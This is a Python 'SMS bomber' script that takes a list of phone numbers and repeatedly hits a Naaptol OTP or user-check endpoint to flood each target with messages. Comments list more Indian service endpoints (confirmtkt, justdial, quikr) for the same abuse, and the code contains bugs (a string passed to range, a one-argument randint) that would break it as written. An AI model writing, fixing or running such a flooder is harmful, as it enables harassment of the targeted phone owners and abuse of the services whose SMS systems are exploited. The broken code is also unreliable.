from urllib.request import Request,urlopen
from urllib.parse import urlencode
import platform
import os
import time
from random import randint

def banner():
    if platform.system().lower()=="windows":
        os.system("cls")
    else:
        os.system("clear")
    print("""

  /$$$$$$  /$$      /$$  /$$$$$$        /$$$$$$$   /$$$$$$  /$$      /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$ 
 /$$__  $$| $$$    /$$$ /$$__  $$      | $$__  $$ /$$__  $$| $$$    /$$$| $$__  $$| $$_____/| $$__  $$
| $$  \__/| $$$$  /$$$$| $$  \__/      | $$  \ $$| $$  \ $$| $$$$  /$$$$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$ | $$ $$/$$ $$|  $$$$$$       | $$$$$$$ | $$  | $$| $$ $$/$$ $$| $$$$$$$ | $$$$$   | $$$$$$$/
 \____  $$| $$  $$$| $$ \____  $$      | $$__  $$| $$  | $$| $$  $$$| $$| $$__  $$| $$__/   | $$__  $$
 /$$  \ $$| $$\  $ | $$ /$$  \ $$      | $$  \ $$| $$  | $$| $$\  $ | $$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$/| $$ \/  | $$|  $$$$$$/      | $$$$$$$/|  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$$$$$$$| $$  | $$
 \______/ |__/     |__/ \______/       |_______/  \______/ |__/     |__/|_______/ |________/|__/  |__/
                                                                                                                                                                                                    
                                   By : D3XBugg3R 
                                   Modded By: Lucas 
                                With <3 of T34M GCA                                                                                                  
    Note : I won't be responsible for any damage caused by this script, Use at your own risk
""")
#http://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=

#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=

#http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=

#http://www.quikr.com/SignIn?aj=1&for=send_otp&user=

#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=

how_many = input("How many numbers do you want to bomb? ")
numbers = [] 
for i in range(how_many):
    temp = str(input(f"Enter the number {i+1}: "))
    numbers.append(temp)

def send(num, counter, slep):
    #url = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=","https://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile="]
    url="https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile="
    data={"phone":num}
    for x in range(counter):
        banner()
        print("Target Number          : ", num)
        print("Number of Message Sent : ", x+1)
        result_url=url+num
        resp1=Request(result_url)
        urlopen(resp1)
        time.sleep(slep)
try:
    banner()
    for number in numbers:
        send(number, int(input(f"Enter Number of Messages for {number} : ")), randint(3))
except Exception as e:
    print("Something is wrong please Re-run this script.")
    
   
